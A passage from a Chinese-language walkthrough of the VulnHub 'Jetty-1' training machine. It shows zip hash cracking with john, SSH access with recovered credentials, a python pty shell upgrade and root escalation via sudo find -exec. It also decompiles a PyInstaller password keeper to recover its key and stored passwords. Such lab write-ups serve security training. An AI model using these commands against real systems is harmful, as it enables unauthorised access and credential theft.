secs (63.4022 kB/s)</span><br><span class="line">ftp&gt; </span><br><span class="line"><span class="comment">###获得ftp文件内容后得知压缩包中有ssh登录密码，使用john进行爆破。</span></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ zip2john sshpass.zip &gt;&gt; sshpass.hash</span><br><span class="line">ver 1.0 efh 5455 efh 7875 sshpass.zip/sshpass.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=CA21C815</span><br><span class="line"><span class="comment">###使用zip2john获得对应zip文件密码hash.</span></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ cat sshpass.hash </span><br><span class="line">sshpass.zip/sshpass.txt:$pkzip2<span class="variable">$1</span>*2*2*0*26*1a*ca21c815*0*45*0*26*ca21*45e9*af4474f0c7ea2f6f4e4f9673b6cfbe90697cfeb31a7b4dceaeffb6a732fd46e59302781fd1cf*$/pkzip2$:sshpass.txt:sshpass.zip::sshpass.zip</span><br><span class="line">                                                                         </span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt sshpass.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (PKZIP [32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">seahorse!        (sshpass.zip/sshpass.txt)</span><br><span class="line">1g 0:00:00:00 DONE (2021-02-19 19:36) 1.123g/s 1472Kp/s 1472Kc/s 1472KC/s sertember..sayonara2</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ unzip sshpass.zip </span><br><span class="line">Archive:  sshpass.zip</span><br><span class="line">[sshpass.zip] sshpass.txt password: </span><br><span class="line"> extracting: sshpass.txt             </span><br><span class="line">                                                                         </span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ ls</span><br><span class="line">README.txt  sshpass.hash  sshpass.txt  sshpass.zip                       </span><br><span class="line"><span class="comment">###使用kali自带字典破解成功后，获得ssh登录密码，使用提示中的帐号，进行SSH登录。</span></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ cat sshpass.txt </span><br><span class="line">Squ1d4r3Th3B3<span class="variable">$t0fTh3W0rLd</span> <span class="comment">##SSH密码 用户:squiddie</span></span><br><span class="line"><span class="comment">##在我年幼无知的时候，从未想到Vuln提示这么重要，我一直找啊找没有找到用户名……</span></span><br><span class="line"><span class="comment">##真实细心和耐心的重要性！</span></span><br><span class="line"></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ ssh root@192.168.88.146 -p 65507                                                                          255 ⨯</span><br><span class="line">root@192.168.88.146<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Received disconnect from 192.168.88.146 port 65507:2: Too many authentication failures</span></span><br><span class="line"><span class="string">Disconnected from 192.168.88.146 port 65507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span></span><br><span class="line"><span class="string">└─$ ssh Jetty@192.168.88.146 -p 65507                                                                         255 ⨯</span></span><br><span class="line"><span class="string">Jetty@192.168.88.146&#x27;</span>s password: </span><br><span class="line">Received disconnect from 192.168.88.146 port 65507:2: Too many authentication failures</span><br><span class="line">Disconnected from 192.168.88.146 port 65507</span><br><span class="line">                                  </span><br><span class="line">                                  ┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ ssh Squiddie@192.168.88.146 -p 65507                                                                                                                            255 ⨯</span><br><span class="line">Squiddie@192.168.88.146<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Received disconnect from 192.168.88.146 port 65507:2: Too many authentication failures</span></span><br><span class="line"><span class="string">Disconnected from 192.168.88.146 port 65507</span></span><br><span class="line"><span class="string">                                                                                           </span></span><br><span class="line"><span class="string">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span></span><br><span class="line"><span class="string">└─$                                                                       </span></span><br><span class="line"><span class="string">              Squ1d4r3Th3B3$t0fTh3W0rLd</span></span><br><span class="line"><span class="string">              </span></span><br><span class="line"><span class="string">              ┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span></span><br><span class="line"><span class="string">└─$ ssh -o IdentitiesOnly=yes Squiddie@192.168.88.146 -p 65507                                                                                                      130 ⨯</span></span><br><span class="line"><span class="string">Squiddie@192.168.88.146&#x27;</span>s password: </span><br><span class="line">Received disconnect from 192.168.88.146 port 65507:2: Too many authentication failures</span><br><span class="line">Disconnected from 192.168.88.146 port 65507</span><br><span class="line"></span><br><span class="line"><span class="comment">###真T坑爹啊，desription说明的用户,居然区分大小写。</span></span><br></pre></td></tr></table></figure><h3 id="Get-ROOT-Shell"><a href="#Get-ROOT-Shell" class="headerlink" title="Get-ROOT-Shell"></a>Get-ROOT-Shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[GCC <span class="number">7.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pty</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">squiddie@jetty:~$ id</span><br><span class="line">uid=1001(squiddie) gid=1001(squiddie) groups=1001(squiddie)</span><br><span class="line">squiddie@jetty:~$ <span class="built_in">cd</span> Desktop/</span><br><span class="line">squiddie@jetty:~/Desktop$ ls</span><br><span class="line">To_Michael.txt  user.txt</span><br><span class="line">squiddie@jetty:~/Desktop$ cat user.txt </span><br><span class="line">dd69f649f3e5159ddd10b83b56b2dda2</span><br><span class="line">squiddie@jetty:~/Desktop$ </span><br><span class="line"><span class="comment">###SSH之后的shell限制太多，需要利用python加载bash。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">squiddie@jetty:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> squiddie on jetty:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User squiddie may run the following commands on jetty:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/find</span><br><span class="line">squiddie@jetty:~$ </span><br><span class="line">squiddie@jetty:~/Documents$ sudo find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 引入shell，会话-》终端-完全终端可以利用nc会话升级。</span></span><br><span class="line"><span class="comment"># export = XTERM ; stty -echo raw ;fg ;reset </span></span><br><span class="line">root@jetty:/root/Desktop<span class="comment"># cat proof.txt </span></span><br><span class="line">136d05d01c8af5d3e3520d2c270f91f1</span><br><span class="line">root@jetty:/root/Desktop<span class="comment"># hostname;id;date;whoami</span></span><br><span class="line">jetty</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Fri Feb 19 04:55:29 PST 2021</span><br><span class="line">root</span><br><span class="line">root@jetty:/root/Desktop<span class="comment"># </span></span><br><span class="line"><span class="comment">###利用sudo进行提权，find命令中可以执行-exec加载bash环境获得ROOT-SHELL</span></span><br></pre></td></tr></table></figure><h3 id="Cracked-Pyinstaller-exe"><a href="#Cracked-Pyinstaller-exe" class="headerlink" title="Cracked-Pyinstaller-exe"></a>Cracked-Pyinstaller-exe</h3><p><img src="/images/Jetty-1/httpserver-getinformation.png" alt="httpserver-getinformation"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@jetty:/root/Documents/.docs<span class="comment"># ls -lah</span></span><br><span class="line">total 80K</span><br><span class="line">drwxr-xr-x 3 root root 4.0K Oct  6  2018 .</span><br><span class="line">drwxr-xr-x 4 root root 4.0K Oct 22  2018 ..</span><br><span class="line">-rw-r--r-- 1 root root  19K Oct  6  2018 Accountabilty_not_cooked.xlsx</span><br><span class="line">-rw-r--r-- 1 root root  12K Oct  6  2018 AccountabiltyReportMorning-1112018.xlsx</span><br><span class="line">-rw-r--r-- 1 root root  16K Oct  6  2018 MoneyBalance.xlsx</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Oct  6  2018 Password_keeper</span><br><span class="line">-rw-r--r-- 1 root root  19K Oct  6  2018 Pending_to_erase.xlsx</span><br><span class="line">root@jetty:/root/Documents/.docs<span class="comment"># </span></span><br><span class="line"><span class="comment">##获取隐藏目录，压缩文件后利用python自带的httpserver将文件copy到自己的电脑。</span></span><br><span class="line">root@jetty:/root/Documents/.docs<span class="comment"># zip -r jetty.zip ./*</span></span><br><span class="line">  adding: Accountabilty_not_cooked.xlsx (deflated 23%)</span><br><span class="line">  adding: AccountabiltyReportMorning-1112018.xlsx (deflated 22%)</span><br><span class="line">  adding: MoneyBalance.xlsx (deflated 28%)</span><br><span class="line">  adding: Password_keeper/ (stored 0%)</span><br><span class="line">  adding: Password_keeper/database.txt (deflated 11%)</span><br><span class="line">  adding: Password_keeper/usage.txt (deflated 49%)</span><br><span class="line">  adding: Password_keeper/password_keeper.exe (deflated 3%)</span><br><span class="line">  adding: Pending_to_erase.xlsx (deflated 23%)</span><br><span class="line">root@jetty:/root/Documents/.docs<span class="comment"># ls </span></span><br><span class="line">Accountabilty_not_cooked.xlsx            MoneyBalance.xlsx</span><br><span class="line">AccountabiltyReportMorning-1112018.xlsx  Password_keeper</span><br><span class="line">jetty.zip                                Pending_to_erase.xlsx</span><br><span class="line">root@jetty:/root/Documents/.docs<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">Usage: </span><br><span class="line">	*Linux: wine password_keeper.exe (database.txt must be <span class="keyword">in</span> the same folder as the password_keeper.exe)</span><br><span class="line">	*Windows: password_keeper.exe (database.txt must be <span class="keyword">in</span> the same folder as the password_keeper.exe)</span><br><span class="line"></span><br><span class="line">This program was compiled using pyinstaller. </span><br><span class="line"></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;aneylFYmV/jz/7g5j+Ck15oreK1VhmaKmTwa8cdSnpY=&quot;</span> | base64 -d                                                </span><br><span class="line">jw��V&amp;W����9��ך+x�U�f��&lt;���R��                                                 </span><br><span class="line"><span class="comment">## base64解码无果，必须破解加密程序，获得加密的密码</span></span><br></pre></td></tr></table></figure><p><img src="/images/Jetty-1/password-error.png" alt="password-error"></p><p><img src="/images/Jetty-1/password-error-2.png" alt="password-error-2"></p><p><img src="/images/Jetty-1/password_keeper.exe.png" alt="password_keeper.exe"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## python pyinstaller 打包的程序，需要提取源码</span></span><br><span class="line"></span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ git remote -v                                                   </span><br><span class="line">origin	https://github.com/extremecoders-re/pyinstxtractor.git (fetch)</span><br><span class="line">origin	https://github.com/extremecoders-re/pyinstxtractor.git (push)</span><br><span class="line"><span class="comment">## 我总共利用了2个pyinstall的程序，但是只有上面这个好用。pyinstxtractor,</span></span><br><span class="line"><span class="comment">## python-unpack-exe提取出来的文件，没有pyc的python的字节码文件。</span></span><br><span class="line"><span class="comment">## 尝试过用heditor进行修改，还是失败了。</span></span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ python pyinstxtractor.py ../Password_keeper/password_keeper.exe</span><br><span class="line"></span><br><span class="line">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1/pyinstxtractor]</span><br><span class="line">└─$ <span class="built_in">cd</span> password_keeper.exe_extracted </span><br><span class="line">                                                                         </span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ ls</span><br><span class="line"> bz2.pyd                       msvcp90.dll                    pyiboot01_bootstrap.pyc                                       pywintypes27.dll       struct.pyc</span><br><span class="line"> Cryptodome                    msvcr90.dll                    pyimod01_os_path.pyc                                          PYZ-00.pyz             unicodedata.pyd</span><br><span class="line"> _ctypes.pyd                   password_keeper.exe.manifest   pyimod02_archive.pyc                                          PYZ-00.pyz_extracted   win32pipe.pyd</span><br><span class="line"> _hashlib.pyd                  password_keeper.py             pyimod03_importers.pyc                                        select.pyd</span><br><span class="line"> Microsoft.VC90.CRT.manifest   password_keeper.pyc           <span class="string">&#x27;pyi-windows-manifest-filename password_keeper.exe.manifest&#x27;</span>   _socket.pyd</span><br><span class="line"> msvcm90.dll                   pyexpat.pyd                    python27.dll                                                  _ssl.pyd</span><br><span class="line">                                                                         </span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ ls | grep password</span><br><span class="line">password_keeper.exe.manifest</span><br><span class="line">password_keeper.pyc</span><br><span class="line">pyi-windows-manifest-filename password_keeper.exe.manifest</span><br><span class="line">                                                                         </span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ uncompyle6 -o . password_keeper.pyc</span><br><span class="line">password_keeper.pyc -- </span><br><span class="line"> </span><br><span class="line"> Successfully decompiled file</span><br><span class="line"><span class="comment">### 利用uncompyle6将python字节码中的代码提取还原出来。</span></span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;N2FlMjE4ZmYyOTI4ZjZiMg==&quot;</span>  | base64 -d</span><br><span class="line">7ae218ff2928f6b2                                                           </span><br><span class="line"><span class="comment">### 找到key之后，使用base64解码成功！</span></span><br><span class="line">┌──(d9㉿D9)-[~/…/vulnhub_wp/jetty1/pyinstxtractor/password_keeper.exe_extracted]</span><br><span class="line">└─$ </span><br><span class="line"></span><br><span class="line"><span class="comment">## cracked get password   </span></span><br><span class="line"></span><br><span class="line">Showing content of your secret passwords...</span><br><span class="line"></span><br><span class="line">Insert password: 7ae218ff2928f6b2    <span class="comment">##密码需要手动输入，我试了几次复制粘贴都失败了。</span></span><br><span class="line"></span><br><span class="line">Tag: Instagram Password: WRONG </span><br><span class="line">Tag: Facebook  Password: PASSWORD </span><br><span class="line">Tag: SSH       Password: TRY </span><br><span class="line">Tag: root      Password: HARDER! </span><br><span class="line"></span><br><span class="line">Press any button to <span class="built_in">return</span> to the menu...</span><br><span class="line"></span><br><span class="line">Choose what you want to <span class="keyword">do</span>: </span><br><span class="line">1) See your passwords!</span><br><span class="line">2) Generate a cipher-password</span><br><span class="line">3) Close</span><br><span class="line">Insert your selection here --&gt; 1</span><br><span class="line"></span><br><span class="line">Showing content of your secret passwords...</span><br><span class="line"></span><br><span class="line">Insert password: 7ae218ff2928f6b2    </span><br><span class="line">Tag: instagram Password: S3x1B0y</span><br><span class="line">Tag: facebook Password: M4rK1sS0s3X1</span><br><span class="line">Tag: Accountabilty_not_cooked Password: co8oiads13kt</span><br><span class="line">Tag: MoneyBalance Password: C5Y0wzGqq4Xw8XGD</span><br><span class="line">Tag: Pending_to_erase Password: 1hi2ChHrtkQsUTOc</span><br><span class="line">Press any button to <span class="built_in">return</span> to the menu... </span><br><span class="line"><span class="comment">###获取到的密码</span></span><br></pre></td></tr></table></figure><p><img src="/images/Jetty-1/excel-1.png" alt="excel-1"></p><p><img src="/images/Jetty-1/pyc-1.png" alt="pyc-1"></p><p><img src="/images/Jetty-1/pyc-2.png" alt="pyc-2"></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><ol><li>pyinstxtractor:<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor.git">https://github.com/extremecoders-re/pyinstxtractor.git</a></li><li>python-exe-unpacker:<a target="_blank" rel="noopener" href="https://github.com/countercept/python-exe-unpacker.git">https://github.com/countercept/python-exe-unpacker.git</a></li><li>uncompyle6:<a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6.git">https://github.com/rocky/python-uncompyle6.git</a><br>虽然第二个文件没有帮助我获得<code>unpacke</code>的pyc文件，但是还是非常好用的。<br>第三个文件可以将pyc字节码提取获得python程序的源码。<br><strong>一定一定要遵循github中的Usage和README进行安装和操作！！！</strong><br><strong>一定一定要遵循github中的Usage和README进行安装和操作！！！</strong><br><strong>一定一定要遵循github中的Usage和README进行安装和操作！！！</strong><br>网络上很多，都是一两年前的了，无脑操作吃大亏！！！</li></ol><h3 id="Password-keeper-exe程序的源代码"><a href="#Password-keeper-exe程序的源代码" class="headerlink" title="Password_keeper.exe程序的源代码"></a>Password_keeper.exe程序的源代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment">#Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment">#Decompiled from: Python 3.6.9 (default, Feb 20 2021, 11:43:38) </span></span><br><span class="line"><span class="comment">#[GCC 10.2.1 20210110]</span></span><br><span class="line"><span class="comment">#Embedded file name: password_keeper.py</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">BS = <span class="number">16</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[<span class="number">0</span>:-<span class="built_in">ord</span>(s[(-<span class="number">1</span>)])]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cipher_message</span>(<span class="params">key, message, iv</span>):</span></span><br><span class="line">    message = pad(message)</span><br><span class="line">    key = base64.b64decode(key)</span><br><span class="line">    obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = obj.encrypt(message)</span><br><span class="line">    ciphertext = base64.b64encode(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher_message</span>(<span class="params">key, ciphertext, iv</span>):</span></span><br><span class="line">    ciphertext = base64.b64decode(ciphertext)</span><br><span class="line">    key = base64.b64decode(key)</span><br><span class="line">    obj2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decipher_text = obj2.decrypt(ciphertext)</span><br><span class="line">    decipher_text = unpad(decipher_text)</span><br><span class="line">    <span class="keyword">return</span> decipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span>(<span class="params">ciphertext, tag, key, iv</span>):</span></span><br><span class="line">    ciphertext = cipher_message(key, ciphertext, iv)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Now copy this into your database.txt (It&#x27;s the free version... pay for an automated tool!)&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Tag Password&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> tag + <span class="string">&#x27; &#x27;</span> + ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_keys</span>(<span class="params">database, key, iv</span>):</span></span><br><span class="line">    check_permissions = raw_input(<span class="string">&#x27;Insert password: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> base64.b64encode(check_permissions) == key:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(database[<span class="number">0</span>])):</span><br><span class="line">            ciphertext = database[<span class="number">1</span>][i]</span><br><span class="line">            decipher = decipher_message(key, ciphertext, iv)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Tag: &#x27;</span> + database[<span class="number">0</span>][i] + <span class="string">&#x27; Password: &#x27;</span> + decipher</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Tag: Instagram Password: WRONG &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Tag: Facebook  Password: PASSWORD &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Tag: SSH       Password: TRY &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Tag: root      Password: HARDER! &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_database</span>():</span></span><br><span class="line">    database = [[], []]</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;database.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip().split()</span><br><span class="line">        database[<span class="number">0</span>].append(line[<span class="number">0</span>])</span><br><span class="line">        database[<span class="number">1</span>].append(line[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Welcome to the best password keeper ever!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;__        __         _                _  __                         &#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\\ \\      / /__  __ _| | ___   _      | |/ /___  ___ _ __   ___ _ __ &#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot; \\ \\ /\\ / / _ \\/ _` | |/ / | | |_____| &#x27; // _ \\/ _ \\ &#x27;_ \\ / _ \\ &#x27;__|&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;  \\ V  V /  __/ (_| |   &lt;| |_| |_____| . \\  __/  __/ |_) |  __/ |   &#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;   \\_/\\_/ 